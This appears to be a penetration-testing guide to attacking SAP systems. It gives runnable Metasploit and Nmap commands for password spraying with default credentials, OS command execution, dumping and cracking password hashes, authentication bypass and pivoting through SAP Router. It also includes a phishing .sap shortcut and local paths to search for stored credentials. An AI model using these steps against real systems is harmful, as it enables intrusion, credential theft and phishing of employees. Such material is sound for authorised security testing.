# SAP-Security-Testing
---

# 🛠️ Detailed Step-by-Step — SAP Red Team Attack Surfaces

---

## 1. RFC Bruteforce / Password Spraying

**Goal:** Find valid SAP usernames/passwords via RFC login.

### 📍 How to Test:

**Tool:** Metasploit

**Command:**
```bash
use auxiliary/scanner/sap/sap_rfc_brute_login
set RHOSTS <SAP_SERVER_IP>
set RPORT 3300
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt
run
```

✅ **Positive Response:**  
If a login is valid, you will see output like:
```
[+] Successful login: USERNAME/PASSWORD
```

**Tip:** Common usernames are `SAP*`, `DDIC`, `ADMIN`, `DEVELOPER`, `TEST`, etc.  
Default passwords like `06071992`, `sap123`, `admin`, etc.

---

## 2. Abuse Remote Function Modules

**Goal:** Abuse SAP remote functions like `SXPG_COMMAND_EXECUTE` or `RFC_ABAP_INSTALL_AND_RUN` for command execution.

### 📍 How to Test:

**Tool:** Custom Python (`pyrfc`) script or Metasploit

**Metasploit Example:**
```bash
use auxiliary/admin/sap/sap_soap_rfc_exec
set RHOSTS <SAP_SERVER_IP>
set FUNCTION SXPG_COMMAND_EXECUTE
set CMD 'whoami'
run
```

✅ **Positive Response:**  
If the function call succeeds, you will see OS command output:
```
[+] Output: sapadm
```

**Tip:** You must have valid SAP credentials before testing.

---

## 3. Misconfigured RFC Destinations

**Goal:** Find RFC destinations that allow unauthenticated or weakly authenticated calls.

### 📍 How to Test:

**Manual:** From SAP GUI (transaction code `SM59`) if you have SAP user.

**Automated:** Using Python `pyrfc` or manual SAP enumeration.

✅ **Positive Response:**  
- RFC destinations with empty credentials
- Weak or default passwords configured

You can abuse it to **pivot** to another SAP system.

---

## 4. Password Hash Dumping

**Goal:** Dump SAP user password hashes (from table `USR02`) via RFC access.

### 📍 How to Test:

**Tool:** Custom Python `pyrfc` script or Metasploit module

**Metasploit Example:**
```bash
use auxiliary/admin/sap/sap_rfc_table_read
set RHOSTS <SAP_SERVER_IP>
set TABLE USR02
run
```

✅ **Positive Response:**  
If successful, you get password hashes like:
```
[+] User: SAP* | Hash: E3AFED0047B08059D0FADA10F400C1E5
```

**Tip:** Later crack the hashes offline using John the Ripper (`--format=sapb`).

---

## 5. SAP Message Server Exploits

**Goal:** Exploit old SAP Message Server vulnerabilities to bypass authentication.

### 📍 How to Test:

**Tool:** Metasploit

**Command:**
```bash
use auxiliary/admin/sap/sap_mgmt_con_bsx_auth_bypass
set RHOSTS <SAP_SERVER_IP>
set RPORT 3600
run
```

✅ **Positive Response:**  
You successfully **bypass login** and interact with SAP system without credentials.

---

## 6. Logon Tickets / SSO Hijack

**Goal:** Abuse SAP SSO tickets if signature verification is weak/missing.

### 📍 How to Test:

**Manual:** Check SAP system parameters:
- `login/accept_sso2_ticket`
- `login/create_sso2_ticket`
- `login/ticket_only_by_https`

✅ **Positive Response:**  
- If ticket signature is not enforced, you can **forge** your own SSO ticket.
- Bypass login without password.

**Tip:** Tools like `sap_gen_sso_ticket` can help forge SSO tickets if insecure.

---

## 7. SAP Router Attacks

**Goal:** Exploit misconfigured SAP Router to pivot internally.

### 📍 How to Test:

**Tool:** Nmap SAP NSE scripts

**Command:**
```bash
nmap -p 3299 <SAP_ROUTER_IP> --script sap-router-enum
```

✅ **Positive Response:**  
- SAP Router allows connecting to internal SAP systems.
- Exposed SAP services are listed.

**Tip:** After pivoting, you can attack hidden SAP servers behind SAP Router.

---

## 8. Weak Authorization Profiles

**Goal:** Find low-privileged users who can run dangerous TCODEs (transaction codes).

### 📍 How to Test:

**Manual:** In SAP GUI, transaction `SUIM → Roles → User roles`  
(If you have some access.)

**Automated:** Query RFC to list TCODEs assigned to user.

✅ **Positive Response:**  
You find a user who can run dangerous transactions like `SE38`, `SA38`, `SM49`, `SM69` — allowing command execution or code upload.

---

## 9. Transport Directory Abuse

**Goal:** Abuse SAP Transport Directory to upload malicious ABAP code.

### 📍 How to Test:

**Manual:** Check if you can upload files to `/usr/sap/trans/` directory.

✅ **Positive Response:**  
If you can place a malicious `.cofiles` and `.data` transport and import it → full code execution inside SAP.

---

## 10. SAP GUI Injection Attacks

**Goal:** Create malicious SAP Shortcut (`*.sap`) files to phish users.

### 📍 How to Test:

**Manual:** Create a `.sap` file that auto-launches a transaction silently.

**Example Malicious SAP Shortcut:**
```ini
[System]
Name=SAP Phish
Client=100
User=VICTIM
Language=EN
Description=Click to Access HR Portal

[Function]
Command=/nSM49
Title=Open HR Portal
```

✅ **Positive Response:**  
When victim double-clicks, it opens SAP transaction `SM49` and attacker runs commands.

---

## 11. Clipboard / Logging Abuse

**Goal:** Steal sensitive information from SAP GUI logs or clipboard history.

### 📍 How to Test:

**Manual:** Check files:
- `%APPDATA%\SAP\Common\saplogon.ini`
- `%APPDATA%\SAP\Common\sapshortcut.ini`
- SAP GUI local cache folders

✅ **Positive Response:**  
You find:
- Cleartext credentials
- Server addresses
- Session cookies

